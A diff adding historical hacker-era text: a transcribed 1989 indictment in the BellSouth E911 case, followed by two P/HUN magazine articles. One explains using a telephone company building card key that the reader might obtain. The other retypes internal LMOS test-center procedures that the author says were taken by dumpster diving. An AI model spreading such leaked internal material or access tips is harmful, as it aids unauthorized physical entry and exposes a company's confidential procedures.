+                        PROPERTY INVOLVED
+
+     1. At all times relevant herein, enhanced 911 (E911) was the
+national computerized telephone service program for handling
+emergency calls to the police, fire, ambulance and emergency
+services in most municipalities in the United States. Dialing 911
+provided the public immediate access to a municipality's Public
+Safety Answering Point (PSAP) through the use of computerized all
+routing. The E911 system also automatically provided the recipient
+of an emergency call with the telephone number and location
+identification of the emergency caller.
+
+     2. At all times relevant herein, the Bell South Telephone
+Company and its subsidiaries ("Bell South") provided telephone
+services in the nine state area including Alabama, Mississippi,
+Georgia, Tennessee, Kentucky, Lousiana {sic}, North Carolina, South
+Carolina and Florida.
+
+     3. At all times relevant herein, the E911 system of Bell South
+was described in the text of a computerized file program known as
+the Bell South Standard Practice 660-225-104SV Control Office
+
+                              - 1 -
+
+Administration of Enhanced 911 Services for Special and Major
+Account Centers date March, 1988 ("E911 Practice"). The E911
+Practice was a highly proprietary and closely held computerized
+text file belonging to the Bell South Telephone Company and stored
+on the company's AIMSX computer in Atlanta, Georgia. The E911
+Practice described the computerized control and maintainence {sic}
+of the E911 system and carried warning notices that it was not to be
+disclosed outside Bell South or any of its subsidiaries except
+under written agreement.
+
+                         COMPUTER HACKERS
+
+     4. At all times relevant herein, computer hackers were
+individual involved with the unauthorized access of computer
+systems by various means.
+
+     5. At all times relevant herein, the Legion of Doom (LOD)
+was a closely knit group of computer hackers involved in:
+
+          a.   Disrupting telecommunications by entering
+               computerized telephone switches and changing the
+               routing on the circuits of the computerized
+               switches.
+          b.   Stealing proprietary computer source code and
+               information from companies and individuals that
+               owned the code and information.
+          c.   Stealing and modifying credit information on
+               individuals maintained in credit bureau computers.
+
+                              - 2 -
+
+          d.   Fraudulently obtaining money and property from
+               companies by altering the computerized information
+               used by the companies.
+          e.   Disseminating information with respect to their
+               methods of attacking computers to other computer
+               hackers in an effort to avoid the focus of law
+               enforcement agencies and telecommunication security
+               experts.
+
+     6. At all times relevant herein ROBERT J. RIGGS, defendant
+herein, was a member of the LOD.
+
+     7. At all times relevant herein CRAIG NEIDORF, defendant
+herein, was a publisher and editor of a computer hacker newletter
+{sic} known as "PHRACK."
+
+     8. At all times relevant herein, a public access computer
+bulletin board system (BBS) was located in Lockport, Illinois which
+provided computer storage space and electronic mail services to its
+users. The Lockport BBS was also used by computer hackers as a
+location for exchanging and developing software tools for computer
+intrusion, and for receiving and distributing hacker tutorials and
+other information.
+
+                             E-MAIL
+
+     9. At all times relevant herein electronic mail (e-mail) was
+a computerized method for sending communications and files between
+individual computers on various computer networks. Persons who
+sent or received e-mail were identified by an e-mail address,
+similar to a postal address. Although a person may have more than
+
+                              - 3 -
+
+one e-mail address, each e-mail address identified a person
+uniquely. The message header of an e-mail message identified both
+the sender and recipient of the e-mail message and the date the
+was {sic} message sent.
+
+     10. Beginning in or about September, 1988, the exact date
+begin unknown to the Grand Jury, and continuing until the return
+date of this indictment, at Lockport, in the Northern District of
+Illinois, Eastern Division, and elsewhere,
+
+                  ROBERT J. RIGGS, also known
+                  as Robert Johnson, also
+                  known as Prophet, and
+                  CRAIG NEIDORF, also known
+                  as Knight Lightning,
+
+defendants herein, together with others known and unknown to the
+Grand Jury, devised and intended to devise and participated in a
+scheme and artifice to defraud and to obtain money and other things
+of value by means of false and fraudulent pretenses and
+representations, well knowing at the time that such pretenses,
+representations and promises were false when made.
+
+                     OBJECT OF FRAUD SCHEME
+
+     11. The object of the fraud scheme was to steal the E911
+Practice text file from the computers of Bell South Telephone
+Company though {sic} the use of false and fraudulent pretenses and
+representations and to conceal all indications that the text file
+had been stolen; and to thereafter publish the information about
+the E911 Practice text file in a hacker publication for
+dissemination.
+
+                              - 4 -
+
+                    OPERATION OF FRAUD SCHEME
+
+     12. It was part of the fraud scheme that the defendant NEIDORF
+would and did advise the defendant RIGGS that he had assembled a
+group of computer hackers for the purpose of distributing computer
+information.
+
+     13. It was further part of the scheme that the defendant
+RIGGS would and did steal sensitive proprietary Bell South
+information files including the E911 Practice text file by gaining
+remote unauthorized access to computers of the Bell South Telephone
+Company.
+
+     14. It was further part of the scheme that the defendant
+RIGGS would and did disguise and conceal the theft of the E911
+Practice text file from Bell South Telephone Company by removing
+all indications of his unauthorized access into Bell South
+computers and by using account codes of legitimate Bell South users
+to disguise his authorized use of the Bell South computer.
+
+     15. It was further part of the scheme that RIGGS would and
+did transfer in interstate commerce a stolen E911 Practice text
+file from Atlanta, Georgia to Lockport, Illinois through the use
+of an interstate computer data network.
+
+     16. It was further part of the scheme that defendant RIGGS
+would and did store the stolen E911 Practice text file on a
+computer bulletin board system in Lockport, Illinois.
+
+     17. It was further part of the scheme that defendant NEIDORF,
+utilizing a computer at the University of Missouri in Columbia,
+Missouri would and did receive a copy of the stolen E911 text file
+
+                              - 5 -
+
+from defendant RIGGS through the Lockport computer bulletin board
+system through the use of an interstate computer data network.
+
+     18. It was further part of the scheme that defendant NEIDORF
+would and did edit and retype the E911 Practice text file at the
+request of the defendant RIGGS in order to conceal the source of
+the E911 Practice text file and to prepare it for publication in
+a computer hacker newsletter.
+
+     19. It was further part of the scheme that defendant NEIDORF
+would and did transfer the stolen E911 Practice text file through
+the use of an interstate computer bulletin board system
+used by defendant RIGGS in Lockport, Illinois.
+
+     20. It was further part of the scheme that the defendants
+RIGGS and NEIDORF would publish information to other computer
+hackers which could be used to gain unauthorized access to
+emergency 911 computer systems in the United States and thereby
+disrupt or halt 911 service in portions of the United States.
+
+     22. It was further a part of the scheme that the defendants
+would and did misrepresent, conceal, and hide, and cause to be
+misrepresented, concealed and hidden the purposes of ane {sic} the
+acts done in furtherance of the fraud scheme, and would and did use
+coded language and other means to avoid detection and apprehension
+
+                              - 6 -
+
+by law enforcement authorities and to otherwise provide security
+to the members of the fraud scheme.
+
+     23. In or about December, 1988, at Lockport, in the
+Northern District of Illinois, Eastern Division, and elsewhere,
+
+               ROBERT J. RIGGS, also known
+               as Robert Johnson, also
+               known as Prophet,
+
+defendant herein, for the purpose of executing the aforesaid
+scheme, did knowingly transmit and cause to be transmitted by means
+of a wire communication in interstate commerce certain signs,
+signals and sounds, namely: a data transfer of a E911 Practice
+text file from Decatur, Georgia to Lockport, Illinois.
+
+     In violation of Title 18, United States Code, Section 1343.
+
+                              - 7 -
+
+                            COUNT TWO
+
+     The SPECIAL APRIL 1987 GRAND JURY further charges:
+
+     1. The Grand Jury realleges and incorporates by reference
+the allegations of paragraphs 1 through 22 of Count One of this
+Indictment as though fully set forth herein.
+
+     2. On or about January 23, 1989, at Lockport, in the
+Northern District of Illinois, Eastern Division and elsewhere,
+
+                  ROBERT J. RIGGS, also known
+                  as Robert Johnson, also
+                  known as Prophet, and
+                  CRAIG NEIDORF, also known
+                  as Knight Lightning,
+
+the defendants herein, for the purposes of executing the aforesaid
+scheme did knowingly transmit and cause to be transmitted by means
+of a wire communication in interstate commerce certain signs,
+signals and sounds, namely: a data transfer of a E911 Practice
+text file from Decatur, Georgia to Lockport, Illinois, an edited
+and retyped E911 Practice text file from Columbia, Missouri, to
+Lockport, Illinois.
+
+     In violation of Title 18, United States Code, Section 1343.
+
+                              - 8 -
+
+                           COUNT THREE
+
+     The SPECIAL APRIL 1987 GRAND JURY further charges:
+
+     1. The Grand Jury realleges and incorporates by reference the
+allegations of paragraphs 1 through 22 of Count One of this
+indictment as though fully set forth herein.
+
+     2. In or about December, 1988, at Lockport, in the Northern
+District of Illinois, Eastern Division, and elsewhere,
+
+                  ROBERT J. RIGGS, also known
+                  as Robert Johnson, also
+                  known as Prophet, and
+                  CRAIG NEIDORF, also known
+                  as Knight Lightning,
+
+defendants herein, did transport and cause to be transported in
+interstate commerce from Decatur, Georgia, to Lockport, Illinois,
+a computerized text file with a value of $5,000 or more, namely:
+
+     A Bell South Standard Practice (BSP) 660-225-104SV- Control
+     Office Administration of Enhanced 911 Services for Special
+     Services and Major Account Centers dated March, 1988; valued
+     at approximately $79,449.00
+
+the defendants then and there knowing the same to have been stolen,
+converted, and taken by fraud;
+
+     In violation of Title 18, United States Code, Section 2314.
+
+                              - 9 -
+
+                           COUNT FOUR
+
+     The SPECIAL APRIL 1987 GRAND JURY further charges:
+
+     1. The Grand Jury realleges and incorporates by reference the
+allegations of paragraphs 1 through 22 of Count one of this
+Indictment as though fully set forth herein.
+
+     2. On or about January 23, 1989, at Lockport, in the Northern
+District of Illinois, Eastern Division, and elsewhere,
+
+                  ROBERT J. RIGGS, also known
+                  as Robert Johnson, also
+                  known as Prophet, and
+                  CRAIG NEIDORF, also known
+                  as Knight Lightning,
+
+defendants herein, did transport and cause to be transported in
+interstate commerce from Columbia, Missouri, to Lockport, Illinois,
+a computerized textfile with a value of $5,000 or more, namely:
+
+          An edited Bell South Standard Practice (BSP) 660-225-
+          104SV- Control Office Administration of Enhanced 911
+          Services for Special Services and Major Account Centers
+          dated March, 1988; valued at approximately $79,449.00.
+
+the defendants, then and there knowing the same to have been
+stolen, converted, and taken by fraud;
+
+     In violation of Title 18, United States Code, Section 2314.
+
+                             - 10 -
+
+                           COUNT FIVE
+
+     The SPECIAL APRIL 1987 GRAND JURY further charges:
+
+     1. The Grand Jury realleges and incorporates by reference
+the allegations of paragraphs 1 through 22 of Count One of this
+Indictment as though fully set forth herein.
+
+     2. On or about December, 1988, at Lockport, in the
+Northern District of Illinois, Eastern Division and elsewhere,
+
+                  ROBERT J. RIGGS, also known
+                  as Robert Johnson, also
+                  known as Prophet, and
+                  CRAIG NEIDORF, also known
+                  as Knight Lightning,
+
+the defendants herein, knowingly and with intent to defraud, trafficked
+in information through which a computer may be accessed without
+authorization and by such conduct affected interstate commerce;
+
+     In violation of Title 18, United States Code, Section
+1030(a)(6)(A).
+
+                             - 11 -
+
+                            COUNT SIX
+
+     The SPECIAL APRIL 1987 GRAND JURY further charges:
+
+     1. The Grand Jury realleges and incorporates by reference
+the allegations of paragraphs 1 through 22 of Count One of this
+Indictment as though fully set forth herein.
+
+     2. In or about January, 1989, at Lockport, in the Northern
+District of Illinois, Eastern Division and elsewhere,
+
+                  ROBERT J. RIGGS, also known
+                  as Robert Johnson, also
+                  known as Prophet, and
+                  CRAIG NEIDORF, also known
+                  as Knight Lightning,
+
+the defendants herein, knowingly and with intend to defraud, trafficked
+in information through which a computer may be accessed without
+authorization and by such conduct affected interstate commerce;
+
+     In violation of Title 18, United States Code, Section
+1030(a)(6)(A).
+
+                             - 12 -
+
+                           COUNT SEVEN
+
+     The SPECIAL APRIL 1987 GRAND JURY further charges:
+
+     1. The Grand Jury realleges and incorporates by reference the
+allegations of paragraphs 1 through 22 of Count One of this
+Indictment as though fully set forth herein.
+
+     2. In or about February, 1989, at Lockport, in the Northern
+District of Illinois, Eastern Division and elsewhere,
+
+                  ROBERT J. RIGGS, also known
+                  as Robert Johnson, also
+                  known as Prophet, and
+                  CRAIG NEIDORF, also known
+                  as Knight Lightning,
+
+the defendants herein, knowingly and with intent to defraud, trafficked
+in information through which a computer may be accessed without
+authorization and by such conduct affected interstate commerce;
+
+     In violation of Title 18, United States Code, Section
+1030(a)(6)(A).
+
+
+                                A TRUE BILL:
+
+
+
+                                ________________________________
+                                F O R E P E R S O N
+
+
+
+________________________________
+UNITED STATES ATTORNEY
+
+
+                             - 13 -
+
+                 ==============END=============
+
+(transcribed for TELECOM Digest by)
+
+Mike Godwin, UT Law School    
+mnemonic@ccwf.cc.utexas.edu   
+mnemonic@walt.cc.utexas.edu   
+(512) 346-4190                
+
+------------------------------
+
+End of TELECOM Digest Special: LoD in Trouble!
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+% = % = % = % = % = % = % = % = % = % =          
+=                                     %          
+%      CARD READER ACCESS SYSTEM      =          
+=                                     %          
+%         By  The Ring Master         =          
+=                                     %          
+%     Phile # 13 of P/HUN Magazine    =          
+=     ----------------------------    %           
+%              Issue #5               =
+=              --------               %
+% = % = % = % = % = % = % = % = % = % =          
+
+
+Sorry for the 40 columns but thats the
+best I can do.
+---------------------------------------
+Incase one of these days you get lucky 
+and get a Telco Card Key, heres how you
+can use it -> :                               
+
+HOW TO USE 'YOUR' COMMAND CARD KEY  
+::::::::::::::::::::::::::::::::::
+
+An ENTER and EXIT sensor is installed at
+the from entrance door.
+
+A personal "Command Key" has been given
+to you which is recognized as a valid
+entry/exit to the building.
+
+Each card is programmer for a specific 
+tour and/or time schedule.Thirty minutes
+on either side of the scheduled time 
+allows for early entry or delayed
+departure. 
+
+Your key card must be used when entering
+and exiting building.
+ - If not used when exiting the building 
+   , it will not unlock the next time it
+   is  used to gain entrance and 
+   vice-versa.
+
+Present your card key to within 2 or 3 
+inches of the ENTER/EXIT sensor. It is
+not necessary to rub care key on the 
+door glass.
+
+If the card key is authorized for that
+door for that time, within several 
+seconds, you will hear the electric 
+strike unlock.
+
+Access/Egress by significant numbers of
+personnel at the same time: For eg:
+(This is just for info purposes) several
+employees going to lunch. This procedure
+will only be  in effect at specific
+buildings with large number of employees
+(for example Switching Control Centers).
+
+- Local management will have to modify 
+  system for specific times.
+ 
+- First employees presents card which
+  opens door.
+
+- Following employees will also present
+  thier card key  to the ENTER/EXIT 
+  sensor in order to be acknowledged by
+  the system program.
+
+- A red indicator light installed in the
+  ENTER/EXIT sensor enclosure will flash
+  on to acknowledge your card key code
+  has been recognized.
+
+===============================================================================
+
+******************************************************************************
+*                                                                            *
+*                        S.S.T.C LMOS GUIDELINES                             *
+*                                                                            *
+*                          By  The Trasher 005                               *
+*                                                                            *
+*                 P/HUN Phile #14 of P/HUN Magazine Issue #5                 *
+*                                                                            * 
+******************************************************************************
+
+This is what I found one day when I went trashing with my phreinds and thought
+it would be it would be nice to type up so everyone can know what procedures
+the SSTC (Special Service Test Center) follows :                           
+
+Heres what it says (to the testers offcourse):
+
+1) Keep all trouble entry codes and narrative complete and accurate to avoid 
+   input error.
+ 
+2) Testers are not to Exclude or RST any trouble. RSA's to exclude or FST only
+   with Magnagement approval.
+
+3) Be aware of measured duration on all trouble. Measurement of duration is
+   everyones job.
+
+4) Use work performed  codes 1,2,3,5 & 6 ONLY ONCE on each trouble.
+
+5) Testers are to leave employee code blank in closeout box. This box is for 
+   RSA use only. Testers are responsible for completing the type, disposition,
+   cause , FL1 (if required) and ATH narrative in closeout section of BOR 
+
+6) All Testers are required to verify unit#, route code, class off service
+   /service code, category of report and FL1 (sub code) on all troubles.
+
+7) All New York Telephone troubles MUST HAVE
+           
+     a. Responsibility code of user
+     b. Job Function code of user
+     c. User Reach number
+ 
+8) Use narrative on EST mask when possiblle. Indicate test, who refered, 
+   TN (Telephone Number), etc.
+
+9) Re:  Escalations - Enter date/time one minute after last entry and in
+   narrative indicate correct date/time, who escalated to level and TN
+
+10) Front Ends Used:
+
+        2B - All suffolk
+        2A - All Nassau (except below)  
+        3A - Hicsville, Levittown and Farmingdale
+
+11) Unit Numbers Used:
+
+        962 - All TTY, DATA, FAA, LOB & WATTS
+        963 - ALL OCC
+        964 - SCC
+        961 - SUFFOLK SPECIALS
+        441 - BAYSHORE S.S.T.C (Testing Unit of Suffolk Spec.)
+
+
+        011 = 2A         038 = 2A
+        022 = 2B         048 = 2B  These Unit numbers "RED FLAG" Top 200
+        033 = 3A         058 = 3A  Customers.
+
+12) ALL Switched Data Troubles are to be MLT  Tested and  indicated in LMOS
+    (and on BOR) with  work performed code 2.
+
+13) Re: STOP/START CLOCK
+
+    Stop clock is to be used on all trouble which we intend to Dispatch
+    to the customer but cannot do so because access is not available to 
+    customer premises - this applies not only on Nassau and Suffolk troubles
+    but on referred out troubles (Bklyn, Qns, Bronx, etc.) as well. The  
+    narrative must provide information to justify the use of Stop clock.
+    The work performance code Zero is THE ONLY code to be used after an eight
+    (stop) and before a nice (start). Any other code will cancel the stop 
+    clock. Stop and Start clock codes can be used a maximum of three times on
+    one trouble report.
+
+        The following Codes indicate a Stop/Start Clock.
+
+        8 - STO - 121 = Stop Clock
+        9 - STA - 122 = Start Clock
+
+14) Re: Delayed Maintenance
+
+    Delayed Maintenance is to be used when the customer has a Ckt out of
+    service but still has communication with same location by use of an   
+    alternate service. Alternate service can be Dial back up or another
+    Ckt. going to the same location. Delayed Maintenance can be used  from 
+    5:00PM friday through 8:00AM Monday. The codes used in LMOSare the same
+    as for Stop/Start Clock. The difference is the narrative must indicate
+    the alternate service the customer has.
+
+                 Example #1 - Customer has D.B.H
+                 Example #2 - Customer Has Ckt # _________ to same location.
+
+    We must ask the customer if he has alternate service on all troubles
+    "carried" overnight. The customer is entitled to a rebate for the entire
+    duration of his trouble if it is over 24 hrs  on Data troubles and all
+    occ orders specify (CCA) Customer Credit Allowance. We are responsible
+    to give the customer the proper credit to which they are entitled.
+
+15) Re: Message Reports
+
+    When sending a message report to another Bureau for Dispatch/Test, make
+    sure the following information is included :
+ 
+    Circuit Number
+    Customer Name
+    Customer Address
+    Customer Reach Number
+    Our Reach Number 
+    U.G Cable/Pair
+    Test
+    Access Hours
+    Vendor Reach number for ok/serial
+   
+    On the original trouble BOR, Enter line of status putting Circuit on hold
+    and the M.R T.T.N
+
+===============END=============================================================
